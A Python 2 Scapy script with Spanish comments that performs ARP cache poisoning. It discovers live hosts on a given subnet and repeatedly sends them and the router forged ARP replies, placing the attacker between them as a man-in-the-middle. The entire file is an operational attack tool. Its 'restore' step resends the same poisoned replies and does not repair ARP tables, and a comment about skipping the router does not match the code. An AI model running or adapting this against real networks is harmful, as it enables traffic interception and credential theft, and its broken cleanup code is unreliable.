from scapy.all import *
import sys
import time

# ARP Poison

# Esta funcion envia una respuesta ARP al host que indicamos en los argumentos.
def respuesta_arp(pdst,hwdst,psrc,hwsrc,iface):
	arp_reply = Ether(dst=hwdst)/ARP(pdst=pdst,hwdst=hwdst,psrc=psrc,hwsrc=hwsrc,op="is-at")
	sendp(arp_reply, iface=iface)

def main():
	# Controlamos la cantidad de argumentos
	if len(sys.argv) != 4:
		print "Uso: python "+sys.argv[0]+" <router> <net_target> interfaz\n"
		print "Ejemplo: python "+sys.argv[0]+" 192.168.1.1 192.168.1.0/24 wlan0"
		print "Ejemplo: python "+sys.argv[0]+" 192.168.0.1 192.168.1.* wlan0"
		sys.exit(1)

	conf.verb=0

	# Aca define el tipo de tecnica que vamos a usar para envenenar la cache.
	tecnica = "reply"

	router_ip = sys.argv[1]
	net = sys.argv[2]
	iface = sys.argv[3]

	# Obtenemos las direccones fisicas de las IPs involucradas.
	# Hacemos una peticion ARP para obtener la MAC del router.

	arp_router = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=router_ip),iface=iface, retry=-2, timeout=2)
	# En caso que no haya respuestas a la peticion ARP que hicimos...
	if(arp_router == None):
		print "El router "+router_ip+" no responde a la peticion ARP. Abortando..."
		sys.exit()

	# De esa peticion obtenemos la informacion que necesitamos.
	router_mac = arp_router[ARP].hwsrc #MAC de router
	mi_ip = arp_router[ARP].pdst # IP del atacante
	mi_mac = arp_router[ARP].hwdst # MAC del atacante

	# Ahora vemos las MACs de los hosts "vivos" en la red.
	ans_net, unans_net = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net),iface=iface,retry=-2,timeout=2)
	# En la lista ans_net se guardan las duplas estimulos-respuestas
	# a las peticiones que hicimos.
	# Guardamos las duplas IP-MACs en dos listas para futuro uso.
	hosts_ips = []
	hosts_macs = []

	# Si el router esta dentro de la red indicada, no nos interesa...
	for estimulo,respuesta in ans_net:
		hosts_ips.append(respuesta[ARP].psrc)
		hosts_macs.append(respuesta[ARP].hwsrc)

	# En caso de que los hosts de la red no respondan a las peticiones ARP
	# abortamos el programa...
	if(len(hosts_ips) == 0):
		print "Ningun host de la red especificada responde a las peticiones ARP. Abortando..."
		sys.exit(1)

	# Imprimimos en pantalla la informacion del envenenamiento
	print "TARGET: IP = "+router_ip+" MAC = "+router_mac
	print "\n"
	for i in xrange(0,len(hosts_ips)):
		print "VICTIM: IP = "+hosts_ips[i]+" MAC = "+hosts_macs[i]

	# ARP Poisonin a la arpspoof (enviamos peticiones ARP a los hosts
	# targets aunque no pidieron ninguna)
	# De esa forma envenenamos la cache ARP de los targets.
	try:
		while 1:
			# Esperamos unos segundos antes de cada ronda de envenenamiento.
			for i in xrange(0,len(hosts_ips)):
				respuesta_arp(hosts_ips[i],hosts_macs[i],router_ip,mi_mac,iface)
				respuesta_arp(router_ip,router_mac,hosts_ips[i],mi_mac,iface)
				time.sleep(5)
	except:
		print "Terminando el envenenamiento."
		print "Arreglando las tablas ARP..."
		time.sleep(2)
		# Arreglamos las tablas de ARP de los hosts (por las dudas mandamos 5 respuestas)
		for j in xrange(1,5):
			for i in xrange(0,len(hosts_ips)):
				respuesta_arp(hosts_ips[i],hosts_macs[i],router_ip,mi_mac,iface)
				respuesta_arp(router_ip,router_mac,hosts_ips[i],mi_mac,iface)
		print "Listo!"

main()
